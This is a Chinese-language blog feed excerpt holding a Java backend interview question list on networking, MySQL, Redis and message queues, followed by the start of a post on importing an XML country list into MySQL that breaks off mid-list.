参考：https://www.zhihu.com/question/67772889?answer_deleted_redirect=true 从浏览器中输入URL到页面加载的发生了什么？ 总体来说分为以下几个过程:DNS解析TCP连接发送HTTP请求服务器处理请求并返回HTTP报文浏览器解析渲染页面连接结束参考：https://segmentfault.com/a/1190000006879700 序列化和反序列化底层如何实现的 ObjectOutputStream 、ObjectInputStream、 readObject writeObject 数据链路层是做什么的? 链路层是为网络层提供数据传送服务的,这种服务要依靠本层具备的功能来实现。链路层应具备如下功能:① 链路连接的建立,拆除,分离.② 帧定界和帧同步.链路层的数据传输单元是帧,协议不同,帧的长短和界面也有差别,但无论如何必须对帧进行定界.③ 顺序控制,指对帧的收发顺序的控制.④ 差错检测和恢复。还有链路标识,流量控制等等.差错检测多用方阵码校验和循环码校验来检测信道上数据的误码,而帧丢失等用序号检测.各种错误的恢复则常靠反馈重发技术来完成. 数据链路层功能： 链路管理：数据链路的建立、维持和释放 帧同步：接收方应当能从收到的比特流中准确区分一帧的开始和结束在什么地方 流量控制：控制发送方发送数据的速率 差错控制：接收端能够发现传输错误，并能纠正错误 帧的透明传输：能判断控制字符和数据 寻址：保证传送到正确的目的节点 数据链路层协议：为实现数据链路控制功能而制定的规程或协议 参考：https://baike.1688.com/doc/view-d2362353.html 网络模型的分层、IP和Mac地址在那个层、TCP和HTTP分别在那个层； IP 是网络层，Mac 是数据链路层TCP/IP协议是传输层协议，主要解决数据如何在网络中传输,而HTTP是应用层协议，主要解决如何包装数据 参考：https://blog.csdn.net/hhcrazy12345/article/details/46682223 TCP滑动窗口； TCP滑动窗口分为接受窗口，发送窗口滑动窗口协议是传输层进行流控的一种措施，接收方通过通告发送方自己的窗口大小，从而控制发送方的发送速度，从而达到防止发送方发送速度过快而导致自己被淹没的目的。 参考：https://www.zhihu.com/question/32255109 TCP为什么可靠； [1] 确认和重传机制建立连接时三次握手同步双方的“序列号 + 确认号 + 窗口大小信息”，是确认重传、流控的基础传输过程中，如果Checksum校验失败、丢包或延时，发送端重传 [2] 数据排序TCP有专门的序列号SN字段，可提供数据re-order [3] 流量控制窗口和计时器的使用。TCP窗口中会指明双方能够发送接收的最大数据量 [4] 拥塞控制TCP的拥塞控制由4个核心算法组成。“慢启动”（Slow Start）“拥塞避免”（Congestion avoidance）“快速重传 ”（Fast Retransmit）“快速恢复”（Fast Recovery） 参考：{https://blog.csdn.net/baidu_35692628/article/details/78255476?locationNum=4&amp;fps=1](https://blog.csdn.net/baidu_35692628/article/details/78255476?locationNum=4&amp;fps=1) Https和Http有什么区别； HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了SSL（Secure Sockets Layer）协议用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS。简单来说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。 具体可参考：https://www.cnblogs.com/wqhwe/p/5407468.html Http 为什么是无状态的； HTTP协议是无状态的，指的是协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。也就是说，打开一个服务器上的网页和上一次打开这个服务器上的网页之间没有任何联系。HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）参考：【https://www.cnblogs.com/gotodsp/p/6366163.html】 地址解析协议ARP； 地址解析协议ARP就是将ip地址解析为以太网中的MAC地址，其实我们都知道，在实际的数据传输的过程中，我们使用的是二层的数据帧，但是我们平时使用的是三层的ip地址，这样，我们就需要这个协议了。参考 :https://blog.csdn.net/wswit/article/details/52578878 OSI七层模型分别对应着五层模型的哪一部分； 参考：http://blog.chinaunix.net/uid-22166872-id-3716751.html TCP三次握手数据丢失了怎么办？那如果后面又找到了呢？ 如果此时ACK在网络中丢失，那么Server端该TCP连接的状态为SYN_RECV，并且依次等待3秒、6秒、12秒后重新发送SYN+ACK包，以便Client重新发送ACK包。 Server重发SYN+ACK包的次数，可以通过设置/proc/sys/net/ipv4/tcp_synack_retries修改，默认值为5。 如果重发指定次数后，仍然未收到ACK应答，那么一段时间后，Server自动关闭这个连接。 但是Client认为这个连接已经建立，如果Client端向Server写数据，Server端将以RST包(用于强制关闭tcp连接)响应，方能感知到Server的错误。 二、数据存储和消息队列2.1、数据库 数据库索引，什么是全文索引，全文索引中的倒排索引是什么原理； 简单的说索引就像书本的目录方便查看数据，它是存储的表中一个特定列的值数据结构（最常见的是B-Tree）全文索引是用于检索字段中是否包含或不包含指定的关键字，有点像搜索引擎的功能，其内部的索引结构采用的是与搜索引擎相同的倒排索引结构倒排索引，其原理是对字段中的文本进行分词，然后为每一个出现的单词记录一个索引项，这个索引项中保存了所有出现过该单词的记录的信息，也就是说在索引中找到这个单词后，就知道哪些记录的字段中包含这个单词了。因此适合用大文本字段的查找 数据库最佳左前缀原则是什么？ 在创建多列索引时，要根据业务需求，where子句中使用最频繁的一列放在最左边可参考：https://blog.csdn.net/SkySuperWL/article/details/52583579 悲观锁和乐观锁的原理和应用场景； 悲观锁(Pessimistic Lock), 顾名思义，就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会block直到它拿到锁。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。 乐观锁(Optimistic Lock), 顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号等机制。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库如果提供类似于write_condition机制的其实都是提供的乐观锁 悲观锁：比较适合写入操作比较频繁的场景，如果出现大量的读取操作，每次读取的时候都会进行加锁，这样会增加大量的锁的开销，降低了系统的吞吐量。乐观锁：比较适合读取操作比较频繁的场景，如果出现大量的写入操作，数据发生冲突的可能性就会增大，为了保证数据的一致性，应用层需要不断的重新获取数据，这样会增加大量的查询操作，降低了系统的吞吐量。总结：两种所各有优缺点，读取频繁使用乐观锁，写入频繁使用悲观锁。 左连接、右连接、内连接、外连接、交叉连接、笛卡儿积等； 左外连接(LEFT OUTER JOIN或LEFT JOIN)右外连接(RIGHT OUTER JOIN或RIGHT JOIN)全外连接(FULL OUTER JOIN或FULL JOIN)内连接 (INNER JOIN)外连接 (OUTER JOIN)交叉连接 (CROSS JOIN) 一般情况下数据库宕机了如何进行恢复（什么是Write Ahead Log机制，什么是Double Write机制，什么是Check Point）； 自由发挥 什么是redo日志、什么是undo日志； Undo日志记录某数据被修改前的值，可以用来在事务失败时进行rollback；Redo日志记录某数据块被修改后的值，可以用来恢复未写入data file的已成功事务更新的数据 数据库中的隔离性是怎样实现的；原子性、一致性、持久性又是如何实现的； 基于日志的REDO/UNDO机制，并通过加锁的机制？小弟懵懂，欢迎大神拍砖 什么是组合索引，组合索引什么时候会失效； 简单的说组合索引就是两个字段组成的索引，像这样创建一个3个字段的索引：ALTER TABLE people ADD INDEX lname_fname_age (lame,fname,age);对于组合索引，不是使用的第一部分，则不会使用索引既失效。或者使用 or 语句时。 关系型数据库和非关系型数据库区别； 非关系型数据库的优势： 性能NOSQL是基于键值对的，可以想象成表中的主键和值的对应关系，而且不需要经过SQL层的解析，所以性能非常高。 可扩展性同样也是因为基于键值对，数据之间没有耦合性，所以非常容易水平扩展。 关系型数据库的优势： 复杂查询,可以用SQL语句方便的在一个表以及多个表之间做非常复杂的数据查询。 事务支持,使得对于安全性能很高的数据访问要求得以实现 MySQL并发情况下怎么解决； 通过事务、隔离级别、锁 MySQL中的MVCC机制是什么意思，根据具体场景，MVCC是否有问题； MVCC (Multiversion Concurrency Control)，即多版本并发控制技术,它使得大部分支持行锁的事务引擎，不再单纯的使用行锁来进行数据库的并发控制，取而代之的是把数据库的行锁与行的多个版本结合起来，只需要很小的开销,就可以实现非锁定读，从而大大提高数据库系统的并发性能 理想MVCC难以实现的根本原因在于企图通过乐观锁代替二段提交。修改两行数据，但为了保证其一致性，与修改两个分布式系统中的数据并无区别，而二提交是目前这种场景保证一致性的唯一手段。二段提交的本质是锁定，乐观锁的本质是消除锁定，二者矛盾，故理想的MVCC难以真正在实际中被应用，Innodb只是借了MVCC这个名字，提供了读的非阻塞而已参考：https://www.cnblogs.com/chenpingzhao/p/5065316.html MySQL 索引使用的注意事项 创建索引大大加快数据的查询速度，但创建索引和维护索引需要消耗时间并占据磁盘空间，增删改索引也要动态的维护更新频繁的列不应设置索引数据量小的表不要使用索引（毕竟总共2页的文档，还要目录吗？）重复数据多的字段不应设为索引（比如性别，只有男和女，一般来说：重复的数据超过百分之15就不该建索引）首先应该考虑对where 和 order by 涉及的列上建立索引 DDL、DML、DCL分别指什么 DML（data manipulation language）：它们是SELECT、UPDATE、INSERT、DELETE，就象它的名字一样，这4条命令是用来对数据库里的数据进行操作的语言 DDL（data definition language）：DDL比DML要多，主要的命令有CREATE、ALTER、DROP等，DDL主要是用在定义或改变表（TABLE）的结构，数据类型，表之间的链接和约束等初始化工作上，他们大多在建立表时使用 DCL（Data Control Language）：是数据库控制功能。是用来设置或更改数据库用户或角色权限的语句，包括（grant,deny,revoke等）语句。在默认状态下，只有sysadmin,dbcreator,db_owner或db_securityadmin等人员才有权力执行DCL explain命令 MySQL的EXPLAIN命令用于SQL语句的查询执行计划(QEP)。这条命令的输出结果能够让我们了解MySQL 优化器是如何执行 事物的隔离级别 读未提交、读以提交、可重复读、可序列化读 脏读、幻读、不可重复读 脏读:一个事务读取另外一个事务尚未提交的数据不可重复读:其他事务的操作导致某个事务两次读取数据不一致不可重复读,针对已经提交的数据。2.两次或多次读取同一条数据幻读:其他事务的数据操作导致某个事务两次读取数据数量不一致。例如：对于两个事物 T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行. 之后, 如果 T1 再次读取同一个表, 就会多出几行.幻读针对已经提交的数据。2.两次或多次读取不同行数据，数量上新增或减少 数据库的几大范式 数据库的三大范式以及五大约束第一范式（1NF）：数据表中的每一列（每个字段）必须是不可拆分的最小单元，也就是确保每一列的原子性；第二范式（2NF）：满足1NF后，要求表中的所有列，都必须依赖于主键，而不能有任何一列与主键没有关系，也就是说一个表只描述一件事情；第三范式（3NF）：必须先满足第二范式（2NF），要求：表中的每一列只与主键直接相关而不是间接相关，（表中的每一列只能依赖于主键）；数据库五大约束1.primary KEY:设置主键约束；2.UNIQUE：设置唯一性约束，不能有重复值；3.DEFAULT 默认值约束，height DOUBLE(3,2)DEFAULT 1.2 height不输入是默认为1,24.NOT NULL：设置非空约束，该字段不能为空；5.FOREIGN key :设置外键约束。 数据库常见的命令 select alert update delete drop ….. 说说分库与分表设计 对于互联网企业来说，大部分数据都是与用户关联的，因此，用户id是最常用的分表字段。因为大部分查询都需要带上用户id，这样既不影响查询，又能够使数据较为均衡地拆分后表的数量一般为2的n次方一种分库分表的路由策略如下： 中间变量 = user_id % (分库数量 * 每个库的表数量) 库 = 取整数 (中间变量 / 每个库的表数量) 表 = 中间变量 % 每个库的表数量 分库与分表带来的分布式困境与应对之策（如何解决分布式下的分库分表，全局表？） 分布式困境:数据迁移与扩容问题表关联问题分页与排序问题分布式事务问题分布式全局唯一ID参考：http://blog.720ui.com/2017/mysql_core_09_multi_db_table2/ 说说 SQL 优化之道 1.对查询进行优化，要尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。2.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描3.应尽量避免在 where 子句中使用 != 或 &lt;&gt; 操作符，否则将引擎放弃使用索引而进行全表扫描4.应尽量避免在 where 子句中使用 or 来连接条件，如果一个字段有索引，一个字段没有索引，将导致引擎放弃使用索引而进行全表扫描，5.in 和 not in 也要慎用，否则会导致全表扫描6.应尽量避免在使用 like 查询7.如果在 where 子句中使用参数，也会导致全表扫描8.应尽量避免在 where 子句中对字段进行表达式操作9.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。10.不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。11.select count() from table；这样不带任何条件的count会引起全表扫描12.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率13.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销14.尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间15.任何地方都不要使用 select from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段16.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。。。。。。可参考:http://www.cnblogs.com/yunfeifei/p/3850440.html MySQL遇到的死锁问题、如何排查与解决 通过SHOW ENGINE INNODB STATUS;来查看死锁日志参考：http://blog.jobbole.com/110301/ 存储引擎的 InnoDB与MyISAM区别，优缺点，使用场景 主要区别：1).MyISAM是非事务安全型的，而InnoDB是事务安全型的。2).MyISAM锁的粒度是表级，而InnoDB支持行级锁定。3).MyISAM支持全文类型索引，而InnoDB不支持全文索引。4).MyISAM相对简单，所以在效率上要优于InnoDB，小型应用可以考虑使用MyISAM。5).MyISAM表是保存成文件的形式，在跨平台的数据转移中使用MyISAM存储会省去不少的麻烦。6).InnoDB表比MyISAM表更安全，可以在保证数据不会丢失的情况下，切换非事务表到事务表（alter table tablename type=innodb）。 应用场景：1).MyISAM管理非事务表。它提供高速存储和检索，以及全文搜索能力。如果应用中需要执行大量的SELECT查询，那么MyISAM是更好的选择。2).InnoDB用于事务处理应用程序，具有众多特性，包括ACID事务支持。如果应用中需要执行大量的INSERT或UPDATE操作，则应该使用InnoDB，这样可以提高多用户并发操作的性能。 索引类别（B+树索引、全文索引、哈希索引）、索引的原理 这个自由发挥 什么是自适应哈希索引（AHI） 来个大佬写答案 为什么要用 B+tree作为MySQL索引的数据结构 来个大佬写答案，好像是磁盘存取原理有关 聚集索引与非聚集索引的区别 聚集（clustered）索引，也叫聚簇索引。定义：数据行的物理顺序与列值（一般是主键的那一列）的逻辑顺序相同，一个表中只能拥有一个聚集索引。非聚集（unclustered）索引。定义：该索引中索引的逻辑顺序与磁盘上行的物理存储顺序不同，一个表中可以拥有多个非聚集索引。根本区别:聚集索引和非聚集索引的根本区别是表记录的排列顺序和与索引的排列顺序是否一致。 遇到过索引失效的情况没，什么时候可能会出现，如何解决 1.如果条件中有or，即使其中有条件带索引也不会使用(这也是为什么尽量少用or的原因)2.对于多列索引，不是使用的第一部分，则不会使用索引3.like查询是以%开头4.如果列类型是字符串，那一定要在条件中将数据使用引号引用起来,否则不使用索引 limit 20000 加载很慢怎么解决 1.子查询优化法先找出第一条数据，然后大于等于这条数据的id就是要获取的数据缺点：数据必须是连续的，可以说不能有where条件，where条件会筛选数据，导致数据失去连续性 2.倒排表优化法倒排表法类似建立索引，用一张表来维护页数，然后通过高效的连接得到数据缺点：只适合数据数固定的情况，数据不能删除，维护页表困难 3.反向查找优化法当偏移超过一半记录数的时候，先用排序，这样偏移就反转了缺点：order by优化比较麻烦，要增加索引，索引影响数据的修改效率，并且要知道总记录数，偏移大于数据的一半4.limit限制优化法把limit偏移量限制低于某个数。。超过这个数等于没数据，参考：https://www.cnblogs.com/shiwenhu/p/5757250.html 如何选择合适的分布式主键方案 请大佬回答 选择合适的数据存储方案 这个看需求和场景吧 常见的几种分布式ID的设计方案 UUID雪花算法GUID 算不算 常见的数据库优化方案，在你的项目中数据库如何进行优化的 1、选取最适用的字段属性2、使用索引3、SQL 优化哎呀，自由发挥 一个Controller调用两个Service，这两Service又都分别调用两个Dao，问其中用到了几个数据库连接池的连接？ 一个连接池的两个连接 ?这个还真没测过 InnoDB的插入缓冲和两次写的概率和意义； 插入缓冲:对于非聚集类索引的插入和更新操作，不是每一次都直接插入到索引页中，而是先插入到内存中。具体做法是：如果该索引页在缓冲池中，直接插入；否则，先将其放入插入缓冲区中，再以一定的频率和索引页合并，这时，就可以将同一个索引页中的多个插入合并到一个IO操作中，大大提高写性能 如果建了一个单列索引，查询的时候查出2列，会用到这个单列索引吗？ 会用到 如果建了一个包含多个列的索引，查询的时候只用了第一列，能不能用上这个索引？查三列呢？ 用到 接上题，如果where条件后面带有一个 i + 5 &lt; 100 会使用到这个索引吗？ 我觉得不会 like %aaa%会使用索引吗? like aaa%呢? 我觉得不会 drop、truncate、delete的区别？ 相同点：1.truncate和不带where子句的delete、以及drop都会删除表内的数据。2.drop、truncate都是DDL语句(数据定义语言),执行后会自动提交。 不同点： truncate 和 delete 只删除数据不删除表的结构(定义)drop 语句将删除表的结构被依赖的约束(constrain)、触发器(trigger)、索引(index)；依赖于该表的存储过程/函数将保留,但是变为 invalid 状态。2.速度，一般来说: drop&gt; truncate &gt; delete更多可参考：http://www.cnblogs.com/8765h/archive/2011/11/25/2374167.html 平时你们是怎么监控数据库的? 慢SQL是怎么排查的？（慢查询日志） 自由发挥 你们数据库是否支持emoji表情，如果不支持，如何操作?选择什么编码方式？如果支持一个表情占几个字节? 支持，选择utf8mb4,一个表情占4个字节 如果查询很慢，你会想到的第一个方式是什么？ （数据库索引） 2.2、Redis Redis 有哪些数据类型 1.String（字符串）2.Hash（哈希）3.List（列表）4.Set（集合）5.zset(sorted set：有序集合) Redis 内部结构 数据库主要由 dict 和 expires 两个字典构成，其中 dict 保存键值对，而 expires 则保存键的过期时间数据库的键总是一个字符串对象，而值可以是任意一种 Redis 数据类型，包括字符串、哈希、集合、列表和有序集….可参考:https://blog.csdn.net/tianshijianbing1989/article/details/50730572 Redis 使用场景 缓存——热数据计数器数据高并发的读写海量数据的读写 Redis 持久化机制 两种方式：rdb（redis database）和aof（append of file） Redis 集群方案与实现 主从复制，高可用集群 Redis 为什么是单线程的？ 因为Redis是基于内存的操作，CPU不是Redis的瓶颈，Redis的瓶颈最有可能是机器内存的大小或者网络带宽。既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了 缓存雪崩、缓存穿透、缓存预热、缓存更新、缓存降级 好多，可以参考：https://www.cnblogs.com/leeSmall/p/8594542.html 使用缓存的合理性问题 热点数据，缓存才有价值 Redis常见的回收策略 volatile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰no-enviction（驱逐）：禁止驱逐数据 Redis插槽的分配 key的有效部分使用CRC16算法计算出哈希值，再将哈希值对16384取余，得到插槽值 Redis主从是怎么选取的 一种是主动切换，另一种是使用sentinel自动方式 Redis复制的过程; 1、slave向master发送sync命令。2、master开启子进程来将dataset写入rdb文件，同时将子进程完成之前接收到的写命令缓存起来。3、子进程写完，父进程得知，开始将RDB文件发送给slave。4、master发送完RDB文件，将缓存的命令也发给slave。5、master增量的把写命令发给slave。 Redis队列应用场景； 大并发下对写的操作 Redis主节点宕机了怎么办，还有没有同步的数据怎么办; 还能怎么办，重启呗。看看是否配置持久化文件，如果配置了，数据会恢复。或者启动哨兵模式，从节点变成master. Redis中zSet跳跃表问题； 高深莫测，可参考：https://blog.csdn.net/acceptedxukai/article/details/17333673 Redis的set的应用场合？ 当需要存储一个列表数据,又不希望出现重复数据时,可选用set Redis高级特性了解吗？ 高级特性是什么？ 主从复制、哨兵、集群、事务、消息发布与订阅、持久化 ？是考这些吗？ Redis的pipeline(管道)有什么用处？ 原生批量命令是原子性,Pipeline是非原子性的.原生批量命令是一个命令对应多个key,Pipeline支持多个命令.原生批量命令是Redis服务端支持实现的,而Pipeline需要服务端与客户端的共同实现 Redis集群宕机如何处理，怎么样进行数据的迁移； 复制 rdb文件或者aof 文件 Redis的集群方案； 主从复制、哨兵、高可用集群 Redis原子操作怎么用比较好； Redis的原子性有两点：1、单个操作是原子性的2、多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来原子操作的意思就是要么成功执行要么失败完全不执行。用现实中的转账比喻最形象，你转账要么成功，要么失败钱不动，不存在你钱转出去了，但收款方没收到这种成功一半失败一半的情况 Redis过期策略是怎么实现的呢？ 懒汉式删除、定期删除、定时删除 2.3、消息队列 消息队列的使用场景 1、异步处理2、应用解耦3、广播4、流量高峰5、消息通讯 消息的重发补偿解决思路 等我变成大佬的时候，再回来写答案 消息的幂等性解决思路 等我变成大佬的时候，再回来写答案 消息的堆积解决思路 持久化？ 自己如何实现消息队列 自由发挥 如何保证消息的有序性 等我变成大佬的时候，再回来写答案 面试题之后篇的链接：http://lrshuai.top/atc/show/110 部分转载自：https://mp.weixin.qq.com/s/wme9AutrG3vqNjk4aIPbeA]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 导入xml文件]]></title>
    <url>%2Fblog%2F2017%2F12%2F19%2FMysql%20%E5%AF%BC%E5%85%A5xml%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[栗子：1、address.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251&lt;select&gt; &lt;option value=&quot;AL&quot;&gt;阿尔巴尼亚&lt;/option&gt; &lt;option value=&quot;DZ&quot;&gt;阿尔及利亚&lt;/option&gt; &lt;option value=&quot;AF&quot;&gt;阿富汗&lt;/option&gt; &lt;option value=&quot;AR&quot;&gt;阿根廷&lt;/option&gt; &lt;option value=&quot;AE&quot;&gt;阿拉伯联合酋长国&lt;/option&gt; &lt;option value=&quot;AW&quot;&gt;阿鲁巴&lt;/option&gt; &lt;option value=&quot;OM&quot;&gt;阿曼&lt;/option&gt; &lt;option value=&quot;AZ&quot;&gt;阿塞拜疆&lt;/option&gt; &lt;option value=&quot;EG&quot;&gt;埃及&lt;/option&gt; &lt;option value=&quot;ET&quot;&gt;埃塞俄比亚&lt;/option&gt; &lt;option value=&quot;IE&quot;&gt;爱尔兰&lt;/option&gt; &lt;option value=&quot;EE&quot;&gt;爱沙尼亚&lt;/option&gt; &lt;option value=&quot;AD&quot;&gt;安道尔&lt;/option&gt; &lt;option value=&quot;AO&quot;&gt;安哥拉&lt;/option&gt; &lt;option value=&quot;AI&quot;&gt;安圭拉岛&lt;/option&gt; &lt;option value=&quot;AG&quot;&gt;安提瓜和巴布达&lt;/option&gt; &lt;option value=&quot;AT&quot;&gt;奥地利&lt;/option&gt; &lt;option value=&quot;AX&quot;&gt;奥兰岛&lt;/option&gt; &lt;option value=&quot;AU&quot;&gt;澳大利亚&lt;/option&gt; &lt;option value=&quot;MO&quot;&gt;澳门特别行政区&lt;/option&gt; &lt;option value=&quot;BB&quot;&gt;巴巴多斯&lt;/option&gt; &lt;option value=&quot;PG&quot;&gt;巴布亚新几内亚&lt;/option&gt; &lt;option value=&quot;BS&quot;&gt;巴哈马&lt;/option&gt; &lt;option value=&quot;PK&quot;&gt;巴基斯坦&lt;/option&gt; &lt;option value=&quot;PY&quot;&gt;巴拉圭&lt;/option&gt; &lt;option value=&quot;PS&quot;&gt;巴勒斯坦民族权力机构&lt;/option&gt; &lt;option value=&quot;BH&quot;&gt;巴林&lt;/option&gt; &lt;option value=&quot;PA&quot;&gt;巴拿马&lt;/option&gt; &lt;option value=&quot;BR&quot;&gt;巴西&lt;/option&gt; &lt;option value=&quot;BY&quot;&gt;白俄罗斯&lt;/option&gt; &lt;option value=&quot;BM&quot;&gt;百慕大群岛&lt;/option&gt; &lt;option value=&quot;BG&quot;&gt;保加利亚&lt;/option&gt; &lt;option value=&quot;MP&quot;&gt;北马里亚纳群岛&lt;/option&gt; &lt;option value=&quot;BJ&quot;&gt;贝宁&lt;/option&gt; &lt;option value=&quot;BE&quot;&gt;比利时&lt;/option&gt; &lt;option value=&quot;IS&quot;&gt;冰岛&lt;/option&gt; &lt;option value=&quot;PR&quot;&gt;波多黎各&lt;/option&gt; &lt;option value=&quot;PL&quot;&gt;波兰&lt;/option&gt; &lt;option value=&quot;BA&quot;&gt;波斯尼亚和黑塞哥维那&lt;/option&gt; &lt;option value=&quot;BO&quot;&gt;玻利维亚&lt;/option&gt; &lt;option value=&quot;BZ&quot;&gt;伯利兹&lt;/option&gt; &lt;option value=&quot;BW&quot;&gt;博茨瓦纳&lt;/option&gt; &lt;option value=&quot;BQ&quot;&gt;博内尔&lt;/option&gt; &lt;option value=&quot;BT&quot;&gt;不丹&lt;/option&gt; &lt;option value=&quot;BF&quot;&gt;布基纳法索&lt;/option&gt; &lt;option value=&quot;BI&quot;&gt;布隆迪&lt;/option&gt; &lt;option value=&quot;BV&quot;&gt;布韦岛&lt;/option&gt; &lt;option value=&quot;KP&quot;&gt;朝鲜&lt;/option&gt; &lt;option value=&quot;GQ&quot;&gt;赤道几内亚&lt;/option&gt; &lt;option value=&quot;DK&quot;&gt;丹麦&lt;/option&gt; &lt;option value=&quot;DE&quot;&gt;德国&lt;/option&gt; &lt;option value=&quot;TL&quot;&gt;东帝汶&lt;/option&gt; &lt;option value=&quot;TG&quot;&gt;多哥&lt;/option&gt; &lt;option value=&quot;DO&quot;&gt;多米尼加共和国&lt;/option&gt; &lt;option value=&quot;DM&quot;&gt;多米尼克&lt;/option&gt; &lt;option value=&quot;RU&quot;&gt;俄罗斯&lt;/option&gt; &lt;option value=&quot;EC&quot;&gt;厄瓜多尔&lt;/option&gt; &lt;option value=&quot;ER&quot;&gt;厄立特里亚&lt;/option&gt; &lt;option value=&quot;FR&quot;&gt;法国&lt;/option&gt; &lt;option value=&quot;FO&quot;&gt;法罗群岛&lt;/option&gt; &lt;option value=&quot;PF&quot;&gt;法属波利尼西亚&lt;/option&gt; &lt;option value=&quot;GF&quot;&gt;法属圭亚那&lt;/option&gt; &lt;option value=&quot;TF&quot;&gt;法属南极地区&lt;/option&gt; &lt;option value=&quot;VA&quot;&gt;梵蒂冈城&lt;/option&gt; &lt;option value=&quot;PH&quot;&gt;菲律宾&lt;/option&gt; &lt;option value=&quot;FJ&quot;&gt;斐济群岛&lt;/option&gt; &lt;option value=&quot;FI&quot;&gt;芬兰&lt;/option&gt; &lt;option value=&quot;CV&quot;&gt;佛得角&lt;/option&gt; &lt;option value=&quot;FK&quot;&gt;福克兰群岛(马尔维纳斯群岛)&lt;/option&gt; &lt;option value=&quot;GM&quot;&gt;冈比亚&lt;/option&gt; &lt;option value=&quot;CD&quot;&gt;刚果(DRC)&lt;/option&gt; &lt;option value=&quot;CG&quot;&gt;刚果共和国&lt;/option&gt; &lt;option value=&quot;CO&quot;&gt;哥伦比亚&lt;/option&gt; &lt;option value=&quot;CR&quot;&gt;哥斯达黎加&lt;/option&gt; &lt;option value=&quot;GG&quot;&gt;格恩西岛&lt;/option&gt; &lt;option value=&quot;GD&quot;&gt;格林纳达&lt;/option&gt; &lt;option value=&quot;GL&quot;&gt;格陵兰&lt;/option&gt; &lt;option value=&quot;GE&quot;&gt;格鲁吉亚&lt;/option&gt; &lt;option value=&quot;CU&quot;&gt;古巴&lt;/option&gt; &lt;option value=&quot;GP&quot;&gt;瓜德罗普岛&lt;/option&gt; &lt;option value=&quot;GU&quot;&gt;关岛&lt;/option&gt; &lt;option value=&quot;GY&quot;&gt;圭亚那&lt;/option&gt; &lt;option value=&quot;KZ&quot;&gt;哈萨克斯坦&lt;/option&gt; &lt;option value=&quot;HT&quot;&gt;海地&lt;/option&gt; &lt;option value=&quot;KR&quot;&gt;韩国&lt;/option&gt; &lt;option value=&quot;NL&quot;&gt;荷兰&lt;/option&gt; &lt;option value=&quot;HM&quot;&gt;赫德和麦克唐纳群岛&lt;/option&gt; &lt;option value=&quot;ME&quot;&gt;黑山共和国&lt;/option&gt; &lt;option value=&quot;HN&quot;&gt;洪都拉斯&lt;/option&gt; &lt;option value=&quot;KI&quot;&gt;基里巴斯&lt;/option&gt; &lt;option value=&quot;DJ&quot;&gt;吉布提&lt;/option&gt; &lt;option value=&quot;KG&quot;&gt;吉尔吉斯斯坦&lt;/option&gt; &lt;option value=&quot;GN&quot;&gt;几内亚&lt;/option&gt; &lt;option value=&quot;GW&quot;&gt;几内亚比绍&lt;/option&gt; &lt;option value=&quot;CA&quot;&gt;加拿大&lt;/option&gt; &lt;option value=&quot;GH&quot;&gt;加纳&lt;/option&gt; &lt;option value=&quot;GA&quot;&gt;加蓬&lt;/option&gt; &lt;option value=&quot;KH&quot;&gt;柬埔寨&lt;/option&gt; &lt;option value=&quot;CZ&quot;&gt;捷克共和国&lt;/option&gt; &lt;option value=&quot;ZW&quot;&gt;津巴布韦&lt;/option&gt; &lt;option value=&quot;CM&quot;&gt;喀麦隆&lt;/option&gt; &lt;option value=&quot;QA&quot;&gt;卡塔尔&lt;/option&gt; &lt;option value=&quot;KY&quot;&gt;开曼群岛&lt;/option&gt; &lt;option value=&quot;CC&quot;&gt;科科斯群岛(基灵群岛)&lt;/option&gt; &lt;option value=&quot;KM&quot;&gt;科摩罗联盟&lt;/option&gt; &lt;option value=&quot;CI&quot;&gt;科特迪瓦共和国&lt;/option&gt; &lt;option value=&quot;KW&quot;&gt;科威特&lt;/option&gt; &lt;option value=&quot;HR&quot;&gt;克罗地亚&lt;/option&gt; &lt;option value=&quot;KE&quot;&gt;肯尼亚&lt;/option&gt; &lt;option 